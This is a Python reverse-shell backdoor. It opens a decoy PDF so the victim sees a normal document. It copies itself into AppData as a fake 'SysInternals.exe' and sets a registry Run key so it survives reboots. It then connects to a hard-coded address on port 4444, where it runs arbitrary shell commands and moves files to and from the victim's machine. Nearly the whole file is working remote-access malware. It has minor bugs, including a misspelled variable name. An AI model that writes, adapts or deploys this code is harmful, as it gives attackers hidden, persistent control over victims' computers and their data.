#!/usr/bin/python

import socket
import subprocess
import json
import os
import base64
import sys
import shutil

class Backdoor_reverse_tcp:
	def __init__(self,ip,port):
		self.persistence()
		self.connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		self.connection.connect((ip,port))
		self.connection.send("\n[+] Connection Established")
	def execute_system_command(self,command):
		DEVNULL = open(os.devnull,"wb")
		return subprocess.check_output(command,shell=True,stderr=DEVNULL,stdin=DEVNULL)
	def persistence(self):
		evil_file_location = os.environ["appdata"] + "\\SysInternals.exe"
		if not os.path.exists(evil_file_location):
			shutil.copyfile(sys.executable, evil_file_location)
			subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file__location + '"', shell=True)
#In case you want for Windows(sys.executable),for Linux(__file__)
	def reliable_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data)
	def reliable_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024)
				return json.loads(json_data)
			except ValueError:
				continue
	def change_working_directory(self,path):
		os.chdir(path)
		return "[+]Changing working directory to " + path
	def read_file(self,path):
		with open(path,"rb") as file:
			return base64.b64encode(file.read())
	def write_file(self,path,content):
		with open(path,"wb") as file:
			file.write(base64.b64decode(content))
			return "[+]La subida fue exitosa!!!"
	def run(self):
		while True:
			received_data = self.reliable_receive()
			if received_data[0] == "exit":
				self.connection.close()
				sys.exit()
			elif received_data[0] == "cd" and len(received_data) > 1:
				command_product = self.change_working_directory(received_data[1])
			elif received_data[0] == "download":
				command_product = self.read_file(received_data[1])
			elif received_data[0] == "upload":
				command_product = self.write_file(received_data[1],received_data[2])
			else:
				command_product = self.execute_system_command(received_data)
			self.reliable_send(command_product)
file_name = sys.MEIPASS + "\sample.pdf"
subprocess.Popen(file_name,shell=True)
try:
	my_backdoor = Backdoor_reverse_tcp("192.168.0.13",4444)
	my_backdoor.run()
except Exception:
	sys.exit()
	
